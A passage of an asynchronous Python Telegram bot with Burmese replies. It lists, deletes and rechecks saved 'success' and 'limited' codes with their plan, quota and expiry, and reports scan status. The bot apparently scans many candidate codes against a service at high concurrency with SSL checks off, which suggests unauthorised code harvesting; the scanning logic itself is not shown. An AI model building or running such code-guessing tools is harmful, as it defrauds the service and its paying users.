    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited: return await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
    
    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            line = f"`{item['code']}` – ⏳ {item.get('plan', 'N/A')}"
            if item.get('usage') and item['usage'] != 'N/A': line += f"\n   📊 {item['usage']}"
            if item.get('quota') and item['quota'] != 'N/A': line += f" | 💾 {item['quota']}"
            if item.get('expire') and item['expire'] != 'N/A': line += f"\n   📅 Expire: {item['expire']}"
            parts.append(line); parts.append("")
    if limited: parts.extend([f"\n⚠️ **Limited Codes** ({len(limited)})"] + limited)
    
    await send_chunks(chat_id, "\n".join(parts), parse_mode="Markdown", reply_to_message_id=message.message_id)

@bot.message_handler(commands=['delete_saved'])
async def delete_saved(message):
    chat_id = message.chat.id
    for d in [success_texts, limited_texts, success_messages, limited_messages]: d.pop(chat_id, None)
    try:
        results, sha = await get_file_content("result.json")
        if str(chat_id) in results:
            del results[str(chat_id)]
            await update_file_content("result.json", results, sha, f"Clear codes for {chat_id}")
    except: pass
    await bot.reply_to(message, "🗑️ Saved codes များအားလုံးဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    notify_setting[chat_id] = not notify_setting.get(chat_id, False)
    save_state()
    await bot.reply_to(message, f"Notify: {'ON' if notify_setting[chat_id] else 'OFF'}")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    if not success: return await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
    
    await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
    new_success, removed = [], []
    for item in success:
        recode = await perform_check(user_data[chat_id]['session_url'], item["code"], chat_id, recheck=True, message=message)
        if recode: new_success.append(item)
        else: removed.append(item["code"])
    
    success_texts[chat_id] = new_success
    msg = f"✅ Still Valid ({len(new_success)}):\n" + "\n".join([i["code"] for i in new_success])
    if removed: msg += f"\n\n❌ Invalid ({len(removed)}):\n" + "\n".join(removed)
    await bot.reply_to(message, msg if new_success or removed else "Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID: return await bot.reply_to(message, "No Permission")
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime = int(time.monotonic() - _start_time)
    h, rem = divmod(uptime, 3600); m, s = divmod(rem, 60)
    await bot.reply_to(message, f"📊 Bot Status\n\n⏱ Uptime: {h}h {m}m {s}s\n🔍 Active Scans: {active_scans}\n👥 Sessions Loaded: {len(user_data)}\n⚡ Concurrency: {CONCURRENCY}")

# ── Polling and main ──────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except:
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30), connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        load_state()
        await load_saved_results()
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
